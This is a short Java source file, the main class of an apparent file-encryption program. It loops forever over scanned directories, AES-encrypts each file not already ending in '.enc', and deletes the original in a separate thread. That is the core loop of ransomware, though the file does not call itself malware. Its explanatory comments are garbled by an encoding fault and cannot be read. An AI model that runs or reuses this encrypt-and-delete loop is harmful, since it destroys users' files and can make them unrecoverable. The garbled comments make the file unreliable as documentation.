package safo;

import java.util.*;
import java.io.*;

import safo.Cryptor;
import safo.Monitor;
import safo.DeleteFile;

/*
 * ����ġ  ���¼ҽ� jar�� commons-codec-1.13.jar(AES256��ȣȭ�ҽ� ���)�� 
 * commons-io-2.6.jar(���� ���丮���� ���� ���丮������ ���� ����� ����� ��)�� ����Ѵ�.
 * MainAESŬ���������� MonitorŬ������ Scanning �޼ҵ带 �̿��Ͽ� ���� ���丮���� ���� ���丮����
 * ������ Arraylist<String> �������� ���� return���ָ� �� ������ �������� ��ȣȭ�� �����ְ� 
 * ���� ������ ������ �Ѵ�. �׸��� ���� ������ ��� �ݺ��Ѵ�. �̶� ��ȣȭ�� ������ �ٽ� ��ȣȭ ��Ű���� �ʴ´�.
 */

public class MainAES {

	public static void main(String[] args) throws Exception {
/*
 * ������ : ���ο� ���� ���� �� ��ȣȭ �����ֱ� ���ؼ� ���ѷ����� ������ ���� �ſ� ��ȿ������ �� ����. �׷��� cpu�� �޸𸮸�
 * �� ����ϴ� ����� ã�ƾ� �ȴ�.
 */
		while (true) {
			for (String list : Monitor.Scanning()) {
				if (!(list.contains(".enc"))) {
					Cryptor.EncodingFile(list);
					Runnable r1 = new DeleteFile(list);
					Thread t1 = new Thread(r1);
					t1.start();
				}
			}
		}

	}

}